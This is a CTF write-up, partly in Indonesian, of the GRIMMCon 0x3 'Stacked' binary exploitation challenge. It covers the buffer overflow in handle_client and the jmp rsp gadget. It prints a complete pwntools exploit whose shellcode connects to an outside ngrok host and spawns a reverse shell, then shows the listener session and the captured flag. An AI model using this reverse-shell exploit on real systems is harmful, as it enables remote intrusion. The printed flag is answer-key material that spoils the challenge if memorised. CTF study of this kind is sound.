---
layout: post
title: "GRIMMCon 0x3 CTF - Binary Exploit"
date: 2020-12-31 12:45:45 +0530
categories:
  - WriteUp
  - PWN
---

![Banner Intro](https://raw.githubusercontent.com/abdullahnz/abdullahnz.github.io/master/_posts/images/grimmcon/intro.png)

## Stacked [489 pts]

Use gadged `jmp rsp` to return at shellcode.

### Overview

main func.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax@17
  int optval; // [sp+1Ch] [bp-44h]@7
  struct sockaddr addr; // [sp+20h] [bp-40h]@17
  __int16 s; // [sp+30h] [bp-30h]@10
  uint16_t v7; // [sp+32h] [bp-2Eh]@10
  uint32_t v8; // [sp+34h] [bp-2Ch]@10
  socklen_t addr_len; // [sp+4Ch] [bp-14h]@16
  int v10; // [sp+50h] [bp-10h]@17
  int v11; // [sp+54h] [bp-Ch]@17
  int fd; // [sp+58h] [bp-8h]@4
  int v13; // [sp+5Ch] [bp-4h]@4

  if ( argc <= 1 )
  {
    fwrite("Not enough arguments.\n", 1uLL, 0x16uLL, _bss_start);
    fwrite("Usage: ./stacked [port]\n", 1uLL, 0x18uLL, _bss_start);
    exit(1);
  }
  v13 = atoi(argv[1]);
  fd = socket(2, 1, 0);
  if ( fd == -1 )
  {
    fwrite("Failed to create socket.\n", 1uLL, 0x19uLL, _bss_start);
    exit(1);
  }
  optval = 1;
  if ( setsockopt(fd, 1, 2, &optval, 4u) < 0 )
  {
    fwrite("Error setting socket options.\n", 1uLL, 0x1EuLL, _bss_start);
    exit(1);
  }
  bzero(&s, 0x10uLL);
  s = 2;
  v8 = htonl(0);
  v7 = htons(v13);
  if ( bind(fd, (const struct sockaddr *)&s, 0x10u) )
  {
    fwrite("Failed to bind socked.\n", 1uLL, 0x17uLL, _bss_start);
    exit(1);
  }
  if ( listen(fd, 5) )
  {
    fwrite("Failed to listen.\n", 1uLL, 0x12uLL, _bss_start);
    exit(1);
  }
  fprintf(_bss_start, "Listening on port %d...\n", (unsigned int)v13, argv);
  addr_len = 16;
  while ( 1 )
  {
    v11 = accept(fd, &addr, &addr_len);
    v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
    fprintf(_bss_start, "Received connection from: %s\n", v3);
    v10 = fork();
    if ( !v10 )
      break;
    close(v11);
  }
  handle_client(v11);
  close(v11);
  exit(0);
}
```

Fungsi main hanya melalukan listening ke localhost dengan port merupakan argument kedua dari user. Lalu, untuk interaksi diproses pada fungsi handle_client.

```c
ssize_t __fastcall handle_client(int a1)
{
  char buf; // [sp+10h] [bp-400h]@1

  send(a1, "Overflow me!\n", 0xDuLL, 0);
  send(a1, "> ", 2uLL, 0);
  return recv(a1, &buf, 0x800uLL, 0);
}
```

Bug-nya terlihat jelas pada *handle_client* dimana terdapat *buffer-overflow* yaitu karena user diberikan input sebesar 0x800, tetapi variable buf hanya berukuran 0x400.

### Exploit

Terdapat fungsi yang menarik disini, yaitu pada fungsi *useful*. Seperti namanya, fungsi ini sangat berguna.

```c
.text:0000000000401557 useful          proc near
.text:0000000000401557                 jmp     rsp
.text:0000000000401557 useful          endp
```

Karena stack executable, bisa return ke shellcode kita dengan gadget diatas.

Oiya, karena interaksi dilakukan tidak langsung pada binarynya *child atau apalah ngga tau istilahnya*, jika inject shellcode *execve* secara langsung, maka stdin, stdout akan masuk *parent*-nya.

Solusi? *socketcall* syscall. Full solver.

```python
#!/usr/bin/python

from pwn import *

BINARY = './stacked'

elf = ELF(BINARY)
context.arch = 'amd64'

gdbscript = ''''''

def debug(gdbscript):
   if type(r) == process:
      gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
   p = 'a'*0x408
   p += p64(elf.sym['useful'])
   p += asm(shellcraft.connect('4.tcp.ngrok.io', 15625))
   p += asm(shellcraft.dup2("rbp", 0))
   p += asm(shellcraft.dup2("rbp", 1))
   p += asm(shellcraft.dup2("rbp", 2))
   p += asm(shellcraft.sh())
   
   r.sendlineafter("> ", p)

   r.interactive()

if __name__ == '__main__':
   if len(sys.argv) > 1:
      r = remote("challenge.ctf.games", sys.argv[1])
   else:
      r = process(ELF_PATH, aslr=0)
   exploit(r)
```

profit.

```python
$ nc -vlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from localhost 57362 received!
id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
ls -l 
total 24
-r--r--r-- 1 root root    39 Dec 29 15:37 flag.txt
---x--x--x 1 root root 17720 Dec 29 15:37 stacked
cat flag.txt
flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}
```

### Flag

`flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}`


